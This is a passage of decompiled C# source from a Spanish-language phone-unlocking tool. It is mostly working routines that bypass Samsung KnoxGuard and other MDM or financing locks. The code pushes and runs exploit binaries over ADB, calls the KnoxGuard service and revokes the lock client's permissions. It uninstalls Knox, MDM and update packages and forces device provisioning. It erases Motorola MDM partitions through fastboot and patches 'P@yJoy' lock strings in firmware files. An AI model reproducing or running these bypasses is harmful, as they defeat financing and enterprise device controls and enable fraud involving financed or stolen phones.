						{
							int num4 = array.Length - array2.Length;
							for (int j = 0; j <= num4; j++)
							{
								bool flag8 = array[j] == array2[0] && array[j + 1] == array2[1] && array[j + 2] == array2[2] && array[j + 3] == array2[3];
								if (flag8)
								{
									int num5 = array3.Length - 1;
									for (int k = 0; k <= num5; k++)
									{
										array[j + k] = array3[k];
									}
									stringBuilder.AppendLine(string.Format("✏️ Cambio aplicado en offset dinámico: 0x{0:X}", j));
									flag2 = true;
									break;
								}
							}
						}
						bool flag9 = flag2;
						if (flag9)
						{
							File.WriteAllBytes(filePath, array);
							stringBuilder.AppendLine("\ud83d\udcbe Archivo guardado correctamente.");
						}
						else
						{
							stringBuilder.AppendLine("⚠ No se encontró 'P@yJoy' para modificar.");
						}
						this.txtOutput.Text = stringBuilder.ToString();
						result = flag2;
					}
				}
				catch (Exception ex2)
				{
					MessageBox.Show("Error inesperado: " + ex2.Message, "Excepción", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					this.txtOutput.Text = "❌ Error inesperado: " + ex2.Message;
					result = false;
				}
				return result;
			}
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x0000CA40 File Offset: 0x0000AC40
		private void CargarPuertosSamsung()
		{
			this.cmbPuertos.Items.Clear();
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE Name LIKE '%(COM%'");
			try
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					string text = managementObject["Name"].ToString();
					bool flag = text.ToLower().Contains("samsung");
					if (flag)
					{
						this.cmbPuertos.Items.Add(text);
					}
				}
			}
			finally
			{
				ManagementObjectCollection.ManagementObjectEnumerator enumerator;
				if (enumerator != null)
				{
					((IDisposable)enumerator).Dispose();
				}
			}
			bool flag2 = this.cmbPuertos.Items.Count > 0;
			if (flag2)
			{
				this.cmbPuertos.SelectedIndex = 0;
			}
			else
			{
				MessageBox.Show("No se encontraron puertos Samsung.");
			}
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x0000CB20 File Offset: 0x0000AD20
		private void EjecutarExploitKnoxGuard()
		{
			this.txtOutput.AppendText("\ud83d\ude80 Iniciando exploit para KnoxGuard..." + Environment.NewLine);
			bool flag = this.cmbDevicesAdb.SelectedItem == null;
			if (flag)
			{
				this.txtOutput.AppendText("❌ No hay dispositivo ADB seleccionado." + Environment.NewLine);
			}
			else
			{
				string device = this.cmbDevicesAdb.SelectedItem.ToString().Split(new char[]
				{
					' '
				})[0];
				string text = "C:\\Tstool\\sm.bin";
				bool flag2 = !File.Exists(text);
				if (flag2)
				{
					this.txtOutput.AppendText("❌ El archivo sm.bin no se encuentra en la ruta esperada." + Environment.NewLine);
				}
				else
				{
					this.txtOutput.AppendText("\ud83d\udce4 Enviando binario al dispositivo..." + Environment.NewLine);
					this.ExecuteAdbCommand(string.Format("push \"{0}\" /data/local/tmp/sm.bin", text), device);
					this.txtOutput.AppendText("\ud83d\udd10 Asignando permisos de ejecución..." + Environment.NewLine);
					this.ExecuteAdbCommand("shell chmod +x /data/local/tmp/sm.bin", device);
					this.txtOutput.AppendText("\ud83e\udde8 Ejecutando el binario en el dispositivo..." + Environment.NewLine);
					this.ExecuteAdbCommand("shell /data/local/tmp/sm.bin", device);
					Thread.Sleep(2000);
					List<string> list = new List<string>
					{
						"shell service call knoxguard_service 37",
						"shell service call knoxguard_service 41 s16 'null'",
						"shell service call knoxguard_service 36"
					};
					try
					{
						foreach (string text2 in list)
						{
							string text3 = this.ExecuteAdbCommand(text2, device);
							this.txtOutput.AppendText(string.Concat(new string[]
							{
								"➤ ",
								text2,
								Environment.NewLine,
								text3,
								Environment.NewLine
							}));
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					string str = this.ExecuteAdbCommand("shell getprop knox.kg.state", device);
					this.txtOutput.AppendText("\ud83d\udccb Estado final KnoxGuard: " + str + Environment.NewLine);
				}
			}
		}

		// Token: 0x060000D7 RID: 215 RVA: 0x0000CD3C File Offset: 0x0000AF3C
		private void btnExploitKG_Click(object sender, EventArgs e)
		{
			this.EjecutarExploitKnoxGuard();
		}

		// Token: 0x060000D8 RID: 216 RVA: 0x0000CD48 File Offset: 0x0000AF48
		private void DesactivarKnoxGuardPorAppOps(string selectedDevice)
		{
			checked
			{
				try
				{
					this.txtOutput.AppendText("\ud83d\udd10 Iniciando proceso para desactivar KnoxGuard por AppOps..." + Environment.NewLine);
					string text = this.ExecuteAdbCommand("shell echo test", selectedDevice);
					bool flag = !text.ToLower().Contains("test");
					if (flag)
					{
						this.txtOutput.AppendText("❌ El dispositivo no respondió correctamente a ADB. Revisa la conexión o autorización." + Environment.NewLine);
					}
					else
					{
						List<string> list = new List<string>
						{
							"shell cmd appops set com.samsung.android.kgclient RECEIVE_BOOT_COMPLETED deny",
							"shell cmd appops set com.samsung.android.kgclient WRITE_SETTINGS deny",
							"shell cmd appops set com.samsung.android.kgclient INTERNET deny",
							"shell cmd appops set com.samsung.android.kgclient ACCESS_NETWORK_STATE deny",
							"shell cmd appops set com.samsung.android.kgclient CHANGE_NETWORK_STATE deny",
							"shell cmd appops set com.samsung.android.kgclient QUERY_ALL_PACKAGES deny",
							"shell cmd appops set com.samsung.android.kgclient MODIFY_AUDIO_SETTINGS deny",
							"shell cmd appops set com.samsung.android.kgclient READ_PRIVILEGED_PHONE_STATE deny",
							"shell cmd appops set com.samsung.android.kgclient MANAGE_CA_CERTIFICATES deny",
							"shell cmd appops set com.samsung.android.kgclient INSTALL_SELF_UPDATES deny",
							"shell cmd appops set com.samsung.android.kgclient WRITE_SECURE_SETTINGS deny",
							"shell cmd appops set com.samsung.android.kgclient BLUETOOTH_CONNECT deny",
							"shell cmd appops set com.samsung.android.kgclient SCHEDULE_EXACT_ALARM deny",
							"shell cmd appops set com.samsung.android.kgclient POST_NOTIFICATION deny",
							"shell cmd appops set com.samsung.android.kgclient WAKE_LOCK deny",
							"shell cmd appops set com.samsung.android.kgclient RUN_ANY_IN_BACKGROUND deny",
							"shell cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND ignore",
							"shell am kill com.samsung.android.kgclient",
							"shell am set-inactive com.samsung.android.kgclient true"
						};
						int num = 1;
						try
						{
							foreach (string text2 in list)
							{
								string text3 = this.ExecuteAdbCommand(text2, selectedDevice).Trim();
								string str = string.Format("[{0}/{1}] ➤ {2}", num, list.Count, text2);
								this.txtOutput.AppendText(str + Environment.NewLine);
								bool flag2 = text3.ToLower().Contains("error") || text3.ToLower().Contains("denied") || text3.ToLower().Contains("unknown");
								if (flag2)
								{
									this.txtOutput.AppendText("⚠️ Resultado: FALLO o comando no reconocido." + Environment.NewLine);
									this.txtOutput.AppendText("\ud83d\udd0e Salida: " + text3 + Environment.NewLine + Environment.NewLine);
								}
								else
								{
									bool flag3 = Operators.CompareString(text3, "", false) == 0;
									if (flag3)
									{
										this.txtOutput.AppendText("✅ Resultado: Éxito (sin respuesta explícita)." + Environment.NewLine + Environment.NewLine);
									}
									else
									{
										this.txtOutput.AppendText("✅ Resultado: Éxito." + Environment.NewLine);
										this.txtOutput.AppendText("\ud83d\udcc4 Salida: " + text3 + Environment.NewLine + Environment.NewLine);
									}
								}
								num++;
							}
						}
						finally
						{
							List<string>.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
						this.txtOutput.AppendText("\ud83d\udd0d Verificando estado final de KnoxGuard..." + Environment.NewLine);
						string text4 = this.ExecuteAdbCommand("shell getprop knox.kg.state", selectedDevice);
						this.txtOutput.AppendText("\ud83d\udccb Estado final KnoxGuard: " + text4.Trim() + Environment.NewLine);
					}
				}
				catch (Exception ex)
				{
					this.txtOutput.AppendText("❌ Error crítico durante el proceso AppOps: " + ex.Message + Environment.NewLine);
				}
			}
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x0000D0D4 File Offset: 0x0000B2D4
		private async void btnDesactivarKG_Click(object sender, EventArgs e)
		{
			this.InitializeProgressBar(4);
			try
			{
				List<string> devices = this.GetAdbDevices();
				bool flag = devices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
				if (flag)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else
				{
					string selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					Dictionary<string, string> paquetesDict = new Dictionary<string, string>
					{
						{
							"Google Play Services",
							"com.google.android.gms"
						},
						{
							"Google Play Store",
							"com.android.vending"
						},
						{
							"Google Services Framework",
							"com.google.android.gsf"
						}
					};
					this.MostrarEstadoAntesDelProceso("Kg New", paquetesDict, selectedDevice);
					List<string> etapa = new List<string>
					{
						"shell pm uninstall --user 0 com.android.dynsystem",
						"shell pm uninstall --user 0 com.android.ons",
						"shell pm uninstall --user 0 com.samsung.android.app.updatecenter",
						"shell pm uninstall --user 0 com.transsion.systemupdate",
						"shell pm uninstall --user 0 com.wssyncmldm",
						"shell pm uninstall --user 0 com.samsung.klmsagent",
						"shell pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms"
					};
					List<string> etapa2 = new List<string>
					{
						"shell pm uninstall --user 0 com.android.systemui",
						"shell am set-inactive com.samsung.android.kgclient true",
						"shell am crash com.samsung.android.kgclient",
						"shell pm uninstall --user 0 com.samsung.android.kgclient",
						"shell pm install-existing --restrict-permissions --user 0 com.samsung.android.kgclient",
						"shell cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND ignore",
						"shell pm suspend com.samsung.android.kgclient",
						"shell am set-inactive com.samsung.android.kgclient true",
						"shell am kill com.samsung.android.kgclient",
						"shell cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND deny",
						"shell cmd appops set com.samsung.android.kgclient RUN_ANY_IN_BACKGROUND deny"
					};
					List<string> etapa3 = new List<string>
					{
						"shell cmd package install-existing --user 0 com.android.systemui",
						"shell settings put global device_provisioned 1",
						"shell settings put secure user_setup_complete 1",
						"shell setprop persist.sys.safemode 1"
					};
					List<string> etapa4 = new List<string>
					{
						"shell setprop persist.sys.safemode 1"
					};
					List<List<string>> etapas = new List<List<string>>
					{
						etapa,
						etapa2,
						etapa3,
						etapa4
					};
					await Task.Run(delegate()
					{
						this.EjecutarProcesoAdb("bypass KG New", etapas, selectedDevice);
					});
					this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.UpdateProgressBar();
					}));
					await Task.Delay(2000);
					this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.txtOutput.AppendText(Environment.NewLine + "✅ Proceso exitoso. No desconecte, espere que se reinicie..." + Environment.NewLine);
						this.txtOutput.AppendText("⚠ En caso de no funcionar, intente con MÉTODO NEW." + Environment.NewLine);
					}));
					await Task.Delay(5000);
					MessageBox.Show("✅ El proceso ha terminado. Si el dispositivo no se reinicia automáticamente, por favor reinícialo manualmente.", "Proceso Finalizado", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					this.ExecuteAdbCommand("shell setprop persist.sys.safemode 1; reboot", selectedDevice);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("❌ Error durante bypass MDM Kg New: {0}", ex.Message));
			}
		}

		// Token: 0x060000DA RID: 218 RVA: 0x0000D11C File Offset: 0x0000B31C
		private void CompararYExportarBloquesAvanzado(string rutaArchivoLock, string rutaArchivoUnlock, string rutaCSVSalida)
		{
			checked
			{
				try
				{
					byte[] array = File.ReadAllBytes(rutaArchivoLock);
					byte[] array2 = File.ReadAllBytes(rutaArchivoUnlock);
					int num = Math.Min(array.Length, array2.Length);
					StringBuilder stringBuilder = new StringBuilder();
					stringBuilder.AppendLine("Offset Inicial,Longitud,Locked,Unlocked,Sugerencia");
					List<Tuple<int, byte, byte>> list = new List<Tuple<int, byte, byte>>();
					int num2 = -2;
					int num3 = num - 1;
					for (int i = 0; i <= num3; i++)
					{
						bool flag = array[i] != array2[i];
						if (flag)
						{
							bool flag2 = i == num2 + 1;
							if (flag2)
							{
								list.Add(Tuple.Create<int, byte, byte>(i, array[i], array2[i]));
							}
							else
							{
								bool flag3 = list.Count > 0;
								if (flag3)
								{
									this.AgregarBloqueCSVConSugerencia(stringBuilder, list);
								}
								list = new List<Tuple<int, byte, byte>>
								{
									Tuple.Create<int, byte, byte>(i, array[i], array2[i])
								};
							}
							num2 = i;
						}
					}
					bool flag4 = list.Count > 0;
					if (flag4)
					{
						this.AgregarBloqueCSVConSugerencia(stringBuilder, list);
					}
					File.WriteAllText(rutaCSVSalida, stringBuilder.ToString());
					MessageBox.Show("Diferencias exportadas con sugerencias.", "Éxito", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				catch (Exception ex)
				{
					MessageBox.Show("Error al comparar archivos: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
		}

		// Token: 0x060000DB RID: 219 RVA: 0x0000D284 File Offset: 0x0000B484
		private void AgregarBloqueCSVConSugerencia(StringBuilder sb, List<Tuple<int, byte, byte>> bloque)
		{
			int item = bloque[0].Item1;
			int count = bloque.Count;
			string text = string.Join(" ", bloque.Select((Form1._Closure$__.$I182-0 == null) ? (Form1._Closure$__.$I182-0 = ((Tuple<int, byte, byte> x) => x.Item2.ToString("X2"))) : Form1._Closure$__.$I182-0));
			string text2 = string.Join(" ", bloque.Select((Form1._Closure$__.$I182-1 == null) ? (Form1._Closure$__.$I182-1 = ((Tuple<int, byte, byte> x) => x.Item3.ToString("X2"))) : Form1._Closure$__.$I182-1));
			bool flag = count == 1 && bloque[0].Item2 == 1 && bloque[0].Item3 == 58;
			string text3;
			if (flag)
			{
				text3 = "Cambio de status (posible desbloqueo)";
			}
			else
			{
				bool flag2 = bloque.All((Form1._Closure$__.$I182-2 == null) ? (Form1._Closure$__.$I182-2 = ((Tuple<int, byte, byte> x) => x.Item3 == 0)) : Form1._Closure$__.$I182-2);
				if (flag2)
				{
					text3 = "Borrado de estructura o checksum";
				}
				else
				{
					bool flag3 = count % 4 == 0;
					if (flag3)
					{
						text3 = "Posible bloque estructurado";
					}
					else
					{
						bool flag4 = count >= 16;
						if (flag4)
						{
							text3 = "Zona estructurada/modificada";
						}
						else
						{
							text3 = "Cambio discreto";
						}
					}
				}
			}
			sb.AppendLine(string.Format("{0:X8},{1},{2},{3},{4}", new object[]
			{
				item,
				count,
				text,
				text2,
				text3
			}));
		}

		// Token: 0x060000DC RID: 220 RVA: 0x0000D3F4 File Offset: 0x0000B5F4
		private void btnComparar_Click(object sender, EventArgs e)
		{
			string rutaArchivoLock = "C:\\Tstool\\Lock.bin";
			string rutaArchivoUnlock = "C:\\Tstool\\Unlock.bin";
			string rutaCSVSalida = "C:\\Tstool\\Diferencias_Con_Sugerencias.csv";
			this.CompararYExportarBloquesAvanzado(rutaArchivoLock, rutaArchivoUnlock, rutaCSVSalida);
		}

		// Token: 0x060000DD RID: 221 RVA: 0x0000D420 File Offset: 0x0000B620
		private void btnPatchFileOppo_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "Archivos binarios (*.bin)|*.bin|Todos los archivos (*.*)|*.*",
				Title = "Selecciona el archivo a editar"
			};
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				string fileName = openFileDialog.FileName;
				this.BuscarYEditarOffset(fileName);
			}
		}

		// Token: 0x060000DE RID: 222 RVA: 0x0000D46C File Offset: 0x0000B66C
		private void ListView1_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.ListView1.SelectedItems.Count > 0;
			if (flag)
			{
				string text = this.ListView1.SelectedItems[0].SubItems[2].Text;
				try
				{
					Process.Start(new ProcessStartInfo
					{
						FileName = text,
						UseShellExecute = true
					});
				}
				catch (Exception ex)
				{
					MessageBox.Show("❌ Error al abrir la URL: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
		}

		// Token: 0x060000DF RID: 223 RVA: 0x0000D514 File Offset: 0x0000B714
		private async Task EjecutarComandosFastboot(List<string> comandos)
		{
			try
			{
				List<string>.Enumerator enumerator = comandos.GetEnumerator();
				while (enumerator.MoveNext())
				{
					Form1._Closure$__186-0 CS$<>8__locals1 = new Form1._Closure$__186-0(CS$<>8__locals1);
					CS$<>8__locals1.$VB$Me = this;
					CS$<>8__locals1.$VB$Local_comando = enumerator.Current;
					Form1._Closure$__186-1 CS$<>8__locals2 = new Form1._Closure$__186-1(CS$<>8__locals2);
					CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1;
					string resultadoBruto = await Task.Run<string>(() => CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.EjecutarFastboot(CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_comando));
					CS$<>8__locals2.$VB$Local_estado = this.AnalizarResultadoFastboot(resultadoBruto);
					this.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.txtOutput.AppendText(string.Format("→ {0} → {1}{2}", CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_comando.ToUpper(), CS$<>8__locals2.$VB$Local_estado, Environment.NewLine));
					}));
				}
			}
			finally
			{
				List<string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
		}

		// Token: 0x060000E0 RID: 224 RVA: 0x0000D560 File Offset: 0x0000B760
		private async void btnwipefastbootmt_Click(object sender, EventArgs e)
		{
			this.wipefastbootmt_Click(RuntimeHelpers.GetObjectValue(sender), e);
		}

		// Token: 0x060000E1 RID: 225 RVA: 0x0000D5A8 File Offset: 0x0000B7A8
		private async void wipefastbootmt_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.cmbDevices.Items.Clear();
				List<string> devices = await Task.Run<List<string>>(() => this.GetFastbootDevices());
				if (devices.Count > 0)
				{
					try
					{
						foreach (string device in devices)
						{
							this.cmbDevices.Items.Add(device);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					this.cmbDevices.SelectedIndex = 0;
					this.fastbootTimer.Enabled = false;
					string selectedDevice = this.cmbDevices.SelectedItem.ToString();
					this.ReadFastbootDeviceInfo(selectedDevice);
					this.txtOutput.AppendText("Operation : MDM Fastboot Motorola" + Environment.NewLine);
					this.txtOutput.AppendText("Remove Method : Generic All devices" + Environment.NewLine);
					List<string> comandos = new List<string>
					{
						"-w",
						"erase userdata",
						"erase mdm",
						"erase carrier",
						"erase debug_token",
						"erase ddr",
						"erase misc",
						"erase metadata",
						"erase cache",
						"reboot"
					};
					await this.EjecutarComandosFastboot(comandos);
					this.txtOutput.AppendText("Process: MDM Fastboot Motorola Generic All devices" + Environment.NewLine + Environment.NewLine);
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
				else
				{
					this.cmbDevices.Items.Add("Waiting for devices...");
					this.cmbDevices.SelectedIndex = 0;
					this.txtOutput.AppendText("No Fastboot devices found." + Environment.NewLine);
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x0000D5F0 File Offset: 0x0000B7F0
		private string AnalizarResultadoFastboot(string salida)
		{
			bool flag = salida.ToLower().Contains("okay") || salida.ToLower().Contains("finished.");
			string result;
			if (flag)
			{
				result = "✔ OK";
			}
			else
			{
				bool flag2 = salida.ToLower().Contains("failed") | salida.ToLower().Contains("error") | salida.ToLower().Contains("denied");
				if (flag2)
				{
					result = "✘ FAILED";
				}
				else
				{
					result = "⚠ UNKNOWN";
				}
			}
			return result;
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x0000D678 File Offset: 0x0000B878
		private void btnfu_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.UpdateComPortList();
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				try
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
					string text = this.EnviarComandoAT("AT+FUS?");
					this.UpdateProgressBar();
					bool flag2 = !string.IsNullOrEmpty(text);
					if (flag2)
					{
						this.txtOutput.AppendText("Respuesta AT+F:" + Environment.NewLine + text + Environment.NewLine);
					}
					else
					{
						this.txtOutput.AppendText("⚠️ No se recibió respuesta. Dispositivo no detectado" + Environment.NewLine);
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("❌ Error: " + ex.Message);
				}
				finally
				{
					this.processRunning = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
					this.btnCancelarProceso.Enabled = false;
				}
			}
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x0000D790 File Offset: 0x0000B990
		private string EnviarComandoAT(string comando)
		{
			string result;
			try
			{
				bool flag = this.cmbPuertos.SelectedItem != null;
				if (flag)
				{
					bool isOpen = this.SerialPort1.IsOpen;
					if (isOpen)
					{
						this.SerialPort1.Close();
					}
					this.txtOutput.Clear();
					string portName = this.cmbPuertos.SelectedItem.ToString().Split(new char[]
					{
						' '
					})[0];
					this.SerialPort1.PortName = portName;
					this.SerialPort1.BaudRate = 115200;
					this.SerialPort1.ReadTimeout = 3000;
					this.SerialPort1.WriteTimeout = 3000;
					this.SerialPort1.Open();
					string text = this.SendAtCommand(comando, 3000);
					this.SerialPort1.Close();
					result = text;
				}
				else
				{
					MessageBox.Show("Por favor selecciona un puerto COM.");
					result = "";
				}
			}
			catch (TimeoutException ex)
			{
				MessageBox.Show("Error: Tiempo de espera agotado al leer desde el puerto COM.");
				result = "";
			}
			catch (Exception ex2)
			{
				MessageBox.Show("Error al comunicarse con el dispositivo: " + ex2.Message);
				result = "";
			}
			return result;
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x0000D8EC File Offset: 0x0000BAEC
		private void btnfacto_Click(object sender, EventArgs e)
		{
			this.UpdateComPortList();
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				DialogResult dialogResult = MessageBox.Show("¿Estás seguro de que deseas restablecer el dispositivo a valores de fábrica?", "Confirmar Restablecimiento", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
				bool flag2 = dialogResult != DialogResult.Yes;
				if (flag2)
				{
					this.txtOutput.AppendText("⚠️ Operación cancelada por el usuario." + Environment.NewLine);
				}
				else
				{
					this.InitializeProgressBar(3);
					this.UpdateProgressBar();
					Task.Run(delegate()
					{
						try
						{
							string r1 = this.EnviarComandoAT("AT+FACTORST=0,0");
							this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.txtOutput.AppendText("\ud83e\udde8 Respuesta Primer metodo:" + Environment.NewLine + r1 + Environment.NewLine);
							}));
							this.UpdateProgressBar();
							string r2 = this.EnviarComandoAT("AT+CRST=FS");
							this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.txtOutput.AppendText("\ud83d\udd01 Respuesta Segundo metodo:" + Environment.NewLine + r2 + Environment.NewLine);
							}));
							this.UpdateProgressBar();
						}
						catch (Exception ex)
						{
							MessageBox.Show("❌ Error en restablecimiento: " + ex.Message);
						}
						finally
						{
							this.processRunning = false;
							this.AplicarPermisosDesdeFirebasePorPlan();
							this.btnCancelarProceso.Enabled = false;
						}
						this.processRunning = false;
						this.btnCancelarProceso.Enabled = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
					});
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x0000D9D8 File Offset: 0x0000BBD8
		private async void btnKgNew_Click(object sender, EventArgs e)
		{
			this.txtOutput.Clear();
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				try
				{
					List<string> devices = this.GetAdbDevices();
					bool flag2 = devices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
					if (flag2)
					{
						MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
						return;
					}
					string selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					Dictionary<string, string> paquetesDict = new Dictionary<string, string>
					{
						{
							"Google Play Services",
							"com.google.android.gms"
						},
						{
							"Google Play Store",
							"com.android.vending"
						},
						{
							"Google Services Framework",
							"com.google.android.gsf"
						}
					};
					this.MostrarEstadoAntesDelProceso("Kg New", paquetesDict, selectedDevice);
					List<string> etapa = new List<string>
					{
						"shell pm uninstall --user 0 com.android.dynsystem",
						"shell pm uninstall --user 0 com.android.ons",
						"shell pm uninstall --user 0 com.samsung.android.app.updatecenter",
						"shell pm uninstall --user 0 com.transsion.systemupdate",
						"shell pm uninstall --user 0 com.wssyncmldm",
						"shell pm uninstall --user 0 com.samsung.klmsagent",
						"shell pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms"
					};
					List<string> etapa2 = new List<string>
					{
						"shell pm uninstall --user 0 com.android.systemui",
						"shell am set-inactive com.samsung.android.kgclient true",
						"shell am crash com.samsung.android.kgclient",
						"shell pm uninstall --user 0 com.samsung.android.kgclient",
						"shell pm install-existing --restrict-permissions --user 0 com.samsung.android.kgclient",
						"shell cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND ignore",
						"shell pm suspend com.samsung.android.kgclient",
						"shell am set-inactive com.samsung.android.kgclient true",
						"shell am kill com.samsung.android.kgclient",
						"shell cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND deny",
						"shell cmd appops set com.samsung.android.kgclient RUN_ANY_IN_BACKGROUND deny",
						"shell cmd appops set com.samsung.android.kgclient RUN_ANY_IN_BACKGROUND deny"
					};
					List<string> etapa3 = new List<string>
					{
						"shell cmd package install-existing --user 0 com.android.systemui",
						"shell settings put global device_provisioned 1",
						"shell settings put secure user_setup_complete 1",
						"Shell setprop persist.sys.safemode 1"
					};
					List<string> etapa4 = new List<string>
					{
						"Shell setprop persist.sys.safemode 1"
					};
					List<List<string>> etapas = new List<List<string>>
					{
						etapa,
						etapa2,
						etapa3,
						etapa4
					};
					this.EjecutarProcesoAdb("bypass KG New", etapas, selectedDevice);
					await Task.Delay(2000);
					this.txtOutput.AppendText(Environment.NewLine + "✅ Proceso exitoso. No desconecte, espere que se reinicie..." + Environment.NewLine);
					this.txtOutput.AppendText("En caso de no funcionar es porque tiene nueva seguridad, intentar con MÉTODO NEW." + Environment.NewLine);
					await Task.Delay(5000);
					MessageBox.Show("✅ El proceso ha terminado. Si el dispositivo no se reinicia automáticamente, por favor reinícialo manualmente.", "Proceso Finalizado", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					this.ExecuteAdbCommand("shell setprop persist.sys.safemode 1; reboot", selectedDevice);
				}
				catch (Exception ex)
				{
					MessageBox.Show(string.Format("Error durante bypass MDM Kg New: {0}", ex.Message));
				}
				finally
				{
					this.processRunning = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
					this.btnCancelarProceso.Enabled = false;
				}
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x0000DA20 File Offset: 0x0000BC20
		private async Task EjecutarPayloadKnoxGuard(string selectedDevice)
		{
			string rutaLocal = "C:\\Tstool\\bin\\fgm.bin";
			string rutaRemota = "/data/local/tmp/fgm.bin";
			try
			{
				this.txtOutput.AppendText("Paso 1: Subiendo binario..." + Environment.NewLine);
				this.EjecutarAdb(string.Format("push \"{0}\" {1}", rutaLocal, rutaRemota), selectedDevice);
				this.txtOutput.AppendText("Paso 2: Estableciendo permisos de ejecución..." + Environment.NewLine);
				this.EjecutarAdb(string.Format("shell chmod +x {0}", rutaRemota), selectedDevice);
				this.txtOutput.AppendText("Paso 3: Ejecutando binario en segundo plano..." + Environment.NewLine);
				this.EjecutarAdb(string.Format("shell nohup {0} > /dev/null>&1 &", rutaRemota), selectedDevice);
				await Task.Delay(7000);
				this.txtOutput.AppendText("Paso 4: Verificando si el proceso está activo (ps | grep fgm)..." + Environment.NewLine);
				string resultadoPS = this.EjecutarAdbConResultado("shell ps | grep fgm", selectedDevice);
				if (string.IsNullOrWhiteSpace(resultadoPS))
				{
					this.txtOutput.AppendText("⚠️ El binario no se está ejecutando o fue bloqueado por el sistema." + Environment.NewLine);
				}
				else
				{
					this.txtOutput.AppendText("✅ Proceso activo: " + resultadoPS + Environment.NewLine);
				}
